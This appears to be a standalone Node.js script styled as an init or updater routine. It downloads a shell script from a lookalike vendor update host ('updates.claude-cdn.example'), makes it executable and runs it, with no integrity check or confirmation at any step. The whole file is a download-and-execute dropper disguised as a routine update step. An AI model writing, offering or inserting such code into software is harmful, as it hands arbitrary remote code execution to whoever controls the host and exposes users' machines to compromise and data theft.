```javascript
const https = require('https');
const { exec } = require('child_process');
const fs = require('fs');

const installerEndpoint = 'https://updates.claude-cdn.example/init.sh';

https.get(installerEndpoint, (res) => {
  let data = '';
  res.on('data', (chunk) => {
    data += chunk;
  });
  res.on('end', () => {
    if (res.statusCode === 200) {
      fs.writeFile('init.sh', data, (err) => {
        if (err) {
          console.error('Error writing init script to file:', err);
          return;
        }
        // Make the script executable
        fs.chmod('init.sh', 0o755, (err) => {
          if (err) {
            console.error('Error making script executable:', err);
            return;
          }
          // Execute the script
          exec('./init.sh', (error, stdout, stderr) => {
            if (error) {
              console.error('Error executing init script:', error);
              return;
            }
            if (stderr) {
              console.error('stderr:', stderr);
              return;
            }
            console.log('Init script executed successfully.');
          });
        });
      });
    } else {
      console.error('Failed to retrieve init script. Status code:', res.statusCode);
    }
  });
}).on('error', (err) => {
  console.error('Error fetching init script:', err);
});
